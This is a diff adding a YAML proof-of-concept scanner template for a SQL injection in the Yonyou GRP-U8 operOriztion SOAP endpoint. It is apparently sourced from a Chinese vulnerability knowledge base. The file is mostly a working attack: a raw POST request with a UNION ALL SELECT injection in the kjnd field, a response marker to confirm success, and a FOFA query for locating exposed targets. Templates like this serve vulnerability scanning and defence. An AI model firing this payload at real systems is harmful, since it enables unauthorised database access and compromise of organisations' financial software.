@@ -1,0 +1,66 @@
+id: poc-rz8mgcgz738wu8qb
+info:
+  name: 用友GRP-U8 operOriztion SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rz8mgcgz738wu8qb'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rz8mgcgz738wu8qb
+    fofa: app="用友-GRP-U8"
+http:
+- raw:
+  - 'POST /services/operOriztion HTTP/1.1
+
+
+    Content-Type: text/xml;charset=UTF-8
+
+
+    SOAPAction: ""
+
+
+
+
+    <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/">
+
+
+    <soapenv:Header/>
+
+
+    <soapenv:Body>
+
+
+    <wsdd:getGsbmfaByKjnd soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+
+
+    <kjnd xsi:type="xsd:string">'' UNION ALL SELECT sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''123456''))-- </kjnd>
+
+
+    </wsdd:getGsbmfaByKjnd>
+
+
+    </soapenv:Body>
+
+
+    </soapenv:Envelope>
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    49ba59abbe56e057
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
